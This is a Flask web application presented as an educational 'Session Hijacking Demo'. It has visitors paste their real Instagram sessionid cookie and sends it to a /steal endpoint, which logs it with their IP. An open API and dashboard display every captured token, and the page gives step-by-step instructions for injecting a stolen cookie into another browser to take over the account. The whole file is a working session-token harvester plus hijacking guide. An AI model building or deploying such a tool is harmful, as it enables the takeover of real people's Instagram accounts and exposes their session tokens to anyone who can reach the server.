from flask import Flask, request, jsonify, render_template_string
import datetime
import json
import os
import uuid

app = Flask(__name__)

captured_sessions = []

# ============== FRONTEND PAGE ==============
FRONTEND = """
<!DOCTYPE html>
<html>
<head><title>Session Hijacking Demo</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:-apple-system,sans-serif; background:#0d1117; color:#c9d1d9; padding:20px; }
.card { max-width:600px; margin:0 auto; }
h1 { color:#f85149; font-family:'Courier New',monospace; }
.sub { color:#8b949e; font-size:14px; margin:8px 0 20px; }
.step {
    background:#161b22; border:1px solid #30363d; border-radius:6px; padding:20px; margin-bottom:16px;
}
.step h3 { color:#58a6ff; margin-bottom:8px; }
.step p { font-size:14px; line-height:1.6; margin-bottom:12px; }
.step code {
    display:block; background:#0d1117; color:#00e676; padding:12px; border-radius:4px;
    font-size:12px; word-break:break-all; margin:8px 0;
}
.step input {
    width:100%; padding:10px; background:#0d1117; border:1px solid #30363d;
    border-radius:4px; color:#c9d1d9; font-size:14px; margin-bottom:8px;
}
.btn {
    background:#238636; color:white; border:none; border-radius:6px;
    padding:10px 24px; font-size:14px; cursor:pointer; margin-right:8px;
}
.btn:hover { background:#2ea043; }
.btn-red { background:#da3633; }
.btn-red:hover { background:#f85149; }
.btn-blue { background:#1f6feb; }
.btn-blue:hover { background:#58a6ff; }
.success { background:#1a3a2a; border:1px solid #3fb950; border-radius:6px; padding:16px; margin-top:16px; display:none; }
.success.show { display:block; }
.success .big { font-size:32px; text-align:center; margin-bottom:8px; color:#3fb950; }
.cookie-box {
    background:#0d1117; border:1px solid #21262d; border-radius:4px; padding:12px;
    font-family:'Courier New',monospace; font-size:12px; word-break:break-all; margin:8px 0;
}
.cookie-box .red { color:#f85149; font-weight:bold; display:block; margin-bottom:4px; }
.cookie-box .green { color:#7ee787; }
.highlight {
    background:#3a1a1a; border:1px solid #f85149; border-radius:6px; padding:16px;
    color:#f85149; font-weight:bold; margin-top:12px;
}
</style></head>
<body>
<div class="card">
<h1>🔴 Session Hijacking Demo</h1>
<p class="sub">Educational demonstration — shows how attackers steal and use session cookies</p>

<div class="step">
    <h3>📋 Step 1: Extract Instagram Session Cookie</h3>
    <p>Open Instagram in your browser (must be logged in), then:</p>
    <code>1. Press F12 → Application → Cookies → instagram.com<br>
2. Find "sessionid" → Copy the VALUE<br>
3. Paste it below:</code>
    <input type="text" id="sessionidInput" placeholder="Paste your sessionid here...">
    <button class="btn" onclick="extractSession()">🔍 Extract & Analyze</button>
    <div id="extractResult"></div>
</div>

<div class="step">
    <h3>🎯 Step 2: Steal via Browser Extension (Simulated)</h3>
    <p>Click below to simulate what happens when a malicious extension steals your cookies:</p>
    <button class="btn btn-blue" onclick="simulateSteal()">🕵️ Simulate Cookie Theft</button>
    <div id="stealResult"></div>
</div>

<div class="step">
    <h3>💉 Step 3: Inject Stolen Cookie & Hijack Session</h3>
    <p>After stealing, you can inject the cookie into another browser:</p>
    <code>1. Open another browser (Chrome/Firefox/Edge)<br>
2. Install "Cookie-Editor" extension<br>
3. Go to instagram.com<br>
4. Click Cookie-Editor → Import → Paste cookie string<br>
5. Save → Refresh → YOU'RE LOGGED IN!</code>
</div>

<div id="successBox" class="success">
    <div class="big">✅</div>
    <strong id="successTitle">Session Stolen!</strong>
    <p id="successMsg"></p>
    <div class="cookie-box" id="cookieBox"></div>
    <div class="highlight">🔴 COPY THIS sessionid → Paste into Cookie-Editor → Refresh Instagram → YOU'RE IN!</div>
</div>
</div>

<script>
var BACKEND = window.location.origin;

function extractSession() {
    var sessionid = document.getElementById('sessionidInput').value.trim();
    if (!sessionid) {
        document.getElementById('extractResult').innerHTML = 
            '<p style="color:#f85149;margin-top:8px;">❌ Please paste a sessionid first</p>';
        return;
    }
    
    // Send to backend for recording
    fetch(BACKEND + '/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookies: 'sessionid=' + sessionid,
            source: 'manual_input',
            userAgent: navigator.userAgent
        })
    });
    
    document.getElementById('extractResult').innerHTML = 
        '<div class="cookie-box" style="margin-top:8px;">' +
        '<span class="red">🔴 sessionid = ' + sessionid + '</span>' +
        '</div>' +
        '<p style="color:#3fb950;margin-top:8px;">✅ Session recorded! Proceed to Step 2.</p>';
}

function simulateSteal() {
    document.getElementById('stealResult').innerHTML = 
        '<div class="cookie-box" style="margin-top:8px;">' +
        '<span class="red">🔴 Simulating extension stealing cookies...</span><br>' +
        '<span class="green">chrome.cookies.getAll({url: "https://instagram.com"})</span><br><br>' +
        '<span style="color:#f85149;">⚠️ In a real attack, the extension would read:</span><br>' +
        '• sessionid (HttpOnly bypassed by extension permissions)<br>' +
        '• ds_user_id<br>' +
        '• csrftoken<br>' +
        '• ig_did<br><br>' +
        '<span style="color:#3fb950;">✅ Check the dashboard to see captured data!</span>' +
        '</div>';
    
    // Fetch latest session data from backend
    fetch(BACKEND + '/api/sessions')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var sessions = data.sessions || [];
            if (sessions.length > 0) {
                var latest = sessions[sessions.length - 1];
                if (latest.parsed && latest.parsed.sessionid) {
                    showSuccess(latest.parsed);
                }
            }
        });
}

function showSuccess(parsed) {
    document.getElementById('successBox').classList.add('show');
    document.getElementById('successTitle').textContent = '✅ REAL Instagram Session Stolen!';
    document.getElementById('successMsg').textContent = 
        'The attacker now has your Instagram session. They can login as you without your password.';
    
    var html = '<span class="red">🔴 sessionid = ' + parsed.sessionid + '</span>';
    if (parsed.ds_user_id) html += '<br><span class="green">ds_user_id = ' + parsed.ds_user_id + '</span>';
    if (parsed.csrftoken) html += '<br><span class="green">csrftoken = ' + parsed.csrftoken + '</span>';
    
    document.getElementById('cookieBox').innerHTML = html;
}
</script>
</div></body></html>
"""

# ============== DASHBOARD ==============
DASHBOARD = """
<!DOCTYPE html>
<html>
<head><title>Dashboard - Real Session Data</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Segoe UI',sans-serif; background:#0d1117; color:#c9d1d9; padding:20px; }
h1 { color:#f85149; font-family:'Courier New',monospace; font-size:22px; }
.header { border-bottom:2px solid #30363d; padding-bottom:16px; margin-bottom:20px; }
.header p { color:#8b949e; font-size:13px; }
.stats { display:flex; gap:12px; margin-bottom:20px; }
.stat { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:16px 20px; flex:1; }
.stat .num { font-size:28px; font-weight:bold; color:#58a6ff; }
.stat .num.red { color:#f85149; }
.stat .label { color:#8b949e; font-size:11px; }
.session {
    background:#161b22; border:1px solid #30363d; border-radius:6px; padding:16px; margin-bottom:12px;
}
.session .meta { color:#8b949e; font-size:12px; margin-bottom:8px; }
.cookies {
    background:#0d1117; border:1px solid #21262d; border-radius:4px; padding:12px;
    font-family:'Courier New',monospace; font-size:12px; word-break:break-all;
}
.cookies .red { color:#f85149; font-weight:bold; }
.cookies .green { color:#7ee787; }
.cookies .blue { color:#79c0ff; }
.badge-red { background:#f85149; color:#fff; padding:2px 8px; border-radius:10px; font-size:11px; }
.empty { text-align:center; padding:60px; color:#484f58; }
.empty .big { font-size:48px; margin-bottom:12px; }
.actions button {
    background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:8px 16px;
    border-radius:6px; cursor:pointer; font-size:13px; margin-right:8px;
}
.actions button:hover { border-color:#58a6ff; color:#58a6ff; }
</style></head>
<body>
<div class="header"><h1>🔴 SESSION DATA DASHBOARD</h1><p>Real Instagram session cookies captured here</p></div>
<div class="stats">
    <div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total Captures</div></div>
    <div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">🔴 sessionid Captures</div></div>
</div>
<div id="container"><div class="empty"><div class="big">📡</div><h3>No data yet</h3><p>Open the frontend page and paste a sessionid</p></div></div>
<div class="actions">
    <button onclick="fetchData()">🔄 Refresh</button>
    <button onclick="clearAll()">🗑️ Clear</button>
</div>
<script>
var BACKEND = window.location.origin;
function fetchData() {
    fetch(BACKEND+'/api/sessions').then(function(r){return r.json()}).then(function(data){
        var sessions = data.sessions || [];
        var igSessions = sessions.filter(function(s){return s.has_instagram_session;});
        document.getElementById('totalCount').textContent = sessions.length;
        document.getElementById('sessionCount').textContent = igSessions.length;
        if(sessions.length===0){
            document.getElementById('container').innerHTML = '<div class="empty"><div class="big">📡</div><h3>No data yet</h3></div>';
            return;
        }
        var html = '';
        for(var i=sessions.length-1;i>=0;i--){
            var s = sessions[i];
            var parsed = '';
            if(s.parsed){
                var keys = Object.keys(s.parsed);
                for(var j=0;j<keys.length;j++){
                    var k=keys[j], v=s.parsed[k];
                    var cls = k==='sessionid'?'red':'green';
                    parsed += '<span class="'+cls+'">'+k+'</span> = <span class="green">'+v+'</span><br>';
                }
            }
            html += '<div class="session"><div class="meta">'+s.timestamp+' | IP: '+s.ip+' | '+
                (s.has_instagram_session?'<span class="badge-red">🔴 sessionid</span>':'<span style="color:#8b949e;">No sessionid</span>')+
                '</div><div class="cookies">'+(parsed||s.cookies||'(empty)')+'</div></div>';
        }
        document.getElementById('container').innerHTML = html;
    });
}
function clearAll(){
    if(!confirm('Clear?'))return;
    fetch(BACKEND+'/clear',{method:'POST'}).then(function(){fetchData();});
}
fetchData();
setInterval(fetchData,2000);
</script>
</body></html>
"""

@app.route("/")
def home():
    return FRONTEND

@app.route("/dashboard")
def dashboard():
    return DASHBOARD

@app.route("/api/sessions")
def api_sessions():
    return jsonify({"sessions": captured_sessions})

@app.route("/steal", methods=["POST"])
def steal():
    data = request.get_json(silent=True) or {}
    cookies = data.get("cookies", "")
    
    record = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": data.get("userAgent", request.headers.get("User-Agent", "")),
        "source": data.get("source", "unknown"),
        "cookies": cookies
    }
    
    parsed = {}
    if cookies:
        for pair in cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                parsed[k.strip()] = v.strip()
    record["parsed"] = parsed
    record["has_instagram_session"] = "sessionid" in parsed
    
    captured_sessions.append(record)
    
    if record["has_instagram_session"]:
        print(f"\n🔴🔴🔴 Instagram sessionid CAPTURED!")
        print(f"   sessionid = {parsed['sessionid']}")
        print(f"   IP: {record['ip']}")
    
    return jsonify({"status": "ok"})

@app.route("/clear", methods=["POST"])
def clear():
    captured_sessions.clear()
    return jsonify({"status": "cleared"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"\n{'='*60}")
    print(f"  🔴 INSTAGRAM SESSION HIJACKING DEMO")
    print(f"{'='*60}")
    print(f"\n  Send students to: http://localhost:{port}")
    print(f"  Dashboard:       http://localhost:{port}/dashboard")
    print(f"{'='*60}\n")
    app.run(host="0.0.0.0", port=port, debug=True)